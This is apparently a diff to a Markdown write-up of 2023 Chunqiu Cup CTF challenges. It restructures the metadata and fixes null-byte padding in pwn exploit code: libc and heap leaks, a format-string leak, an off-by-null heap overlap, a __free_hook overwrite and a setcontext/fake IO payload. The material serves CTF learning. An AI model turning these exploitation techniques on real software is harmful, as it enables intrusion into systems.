@@ -11,7 +11,10 @@ tags:
 - off-by-null
 - setcontext+orw
 - lua字节码
-attack_chain: p2048栈溢出+partial write 4bit爆破→LzhiFTP格式化字符串泄elfbase+idx负数越界写got→lua字节码修复+off-by-null堆overleap+setcontext+orw劫持free_hook
+attack_chain:
+- 'p2048栈溢出+partial write 4bit爆破'
+- 'LzhiFTP格式化字符串泄elfbase+idx负数越界写got'
+- 'lua字节码修复+off-by-null堆overleap+setcontext+orw劫持free_hook'
 key_payload: p2048:sl(b'a'*(1048+4)+b'\x60'+b'\x5e'+b'\xff');LzhiFTP:'No%6$p'泄elfbase+idx=-16负数越界;setcontext+orw;lua字节码修复文件头
 one_liner: 春秋杯2023春季赛pwn/web/misc三方向：p2048栈溢出+partial write+FTP fmtstr+got覆写+lua堆
 lesson: partial write爆破4bit+fmtstr %p泄elfbase+idx未检查负数是常见pwn套路
@@ -56,6 +59,9 @@ prerequisites:
 - off-by-null 堆 overleap
 - setcontext+orw 链构造
 - Lua 字节码 magic 头
+contest_normalized: "春秋杯"
+contest_year: 2023
+subcategory_guess: "rop"
 ---
 # 春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇
 
@@ -297,14 +303,14 @@ add(0x510,3)
 
 add(0x500,3)
 show(2)
-libc_base = u64(ru('x7f')[-6:].ljust(8,' '))-0x1ecb0a-0x500
+libc_base = u64(ru('x7f')[-6:].ljust(8,'\\x00'))-0x1ecb0a-0x500
 print hex(libc_base)
 delete(2)
 add(0x510, 3)
 add(0x500,3,'a'*16)
 show(3)
 ru('a'*16)
-heap_addr = u64(ru('x3e')[-7:-1].ljust(8,' ')) - 0xb20a
+heap_addr = u64(ru('x3e')[-7:-1].ljust(8,'\\x00')) - 0xb20a
 print hex(heap_addr)
 
 fake_size = 0x110*4 - 0x10
@@ -319,7 +325,7 @@ add(0x500,3)
 
 delete(8)
 
-add(0x108,1,' '*0x100+p64(0x430))
+add(0x108,1,'\\x00'*0x100+p64(0x430))
 
 delete(9)
 
@@ -331,7 +337,7 @@ mprotect =libc_base + libc.sym['mprotect']
 og = libc_base + 0x00000000001518b0
 print hex(og)
 
-add(0x4f0,3, ' '*0xf8+p64(0x110)+p64(free_hook-8))
+add(0x4f0,3, '\\x00'*0xf8+p64(0x110)+p64(free_hook-8))
 add(0x100, 2, p64(0) + p64(og))
 add(0x100, 2, p64(0) + p64(og))
 
@@ -561,11 +567,11 @@ sig.rsp = heap_addr + 0x100
 fake_io_addr = heap_addr + 0x3930
 fake_largebin = p64(fd_bk)*2 + p64(fd_next) + p64(target-0x20)
 payload = fake_largebin
-payload = payload.ljust(0x528, ' ')
+payload = payload.ljust(0x528, '\\x00')
 payload += p64(0x530)
 payload += 'cat flag' + str(sig)[0x18:
 0xd0] +p64(0)*2 + p64(fake_io_addr+0x40+0x38) + str(sig)[0xd8:]
-payload = payload.ljust(0x530+0x528,' ')
+payload = payload.ljust(0x530+0x528,'\\x00')
 
 payload += p64(0x521)+p64(libc_base + 0x219ce0)*2
 
@@ -911,14 +917,14 @@ add(0x510,3)
 
 add(0x500,3)
 show(2)
-libc_base = u64(ru('x7f')[-6:].ljust(8,' '))-0x1ecb0a-0x500
+libc_base = u64(ru('x7f')[-6:].ljust(8,'\\x00'))-0x1ecb0a-0x500
 print hex(libc_base)
 delete(2)
 add(0x510, 3)
 add(0x500,3,'a'*16)
 show(3)
 ru('a'*16)
-heap_addr = u64(ru('x3e')[-7:-1].ljust(8,' ')) - 0xb20a
+heap_addr = u64(ru('x3e')[-7:-1].ljust(8,'\\x00')) - 0xb20a
 print hex(heap_addr)
 
 fake_size = 0x110*4 - 0x10
@@ -933,7 +939,7 @@ add(0x500,3)
 
 delete(8)
 
-add(0x108,1,' '*0x100+p64(0x430))
+add(0x108,1,'\\x00'*0x100+p64(0x430))
 
 delete(9)
 
@@ -945,7 +951,7 @@ mprotect =libc_base + libc.sym['mprotect']
 og = libc_base + 0x00000000001518b0
 print hex(og)
 
-add(0x4f0,3, ' '*0xf8+p64(0x110)+p64(free_hook-8))
+add(0x4f0,3, '\\x00'*0xf8+p64(0x110)+p64(free_hook-8))
 add(0x100, 2, p64(0) + p64(og))
 add(0x100, 2, p64(0) + p64(og))
 
@@ -1164,11 +1170,11 @@ sig.rsp = heap_addr + 0x100
 fake_io_addr = heap_addr + 0x3930
 fake_largebin = p64(fd_bk)*2 + p64(fd_next) + p64(target-0x20)
 payload = fake_largebin
-payload = payload.ljust(0x528, ' ')
+payload = payload.ljust(0x528, '\\x00')
 payload += p64(0x530)
 payload += 'cat flag' + str(sig)[0x18:
 0xd0] +p64(0)*2 + p64(fake_io_addr+0x40+0x38) + str(sig)[0xd8:]
-payload = payload.ljust(0x530+0x528,' ')
+payload = payload.ljust(0x530+0x528,'\\x00')
 
 payload += p64(0x521)+p64(libc_base + 0x219ce0)*2
 
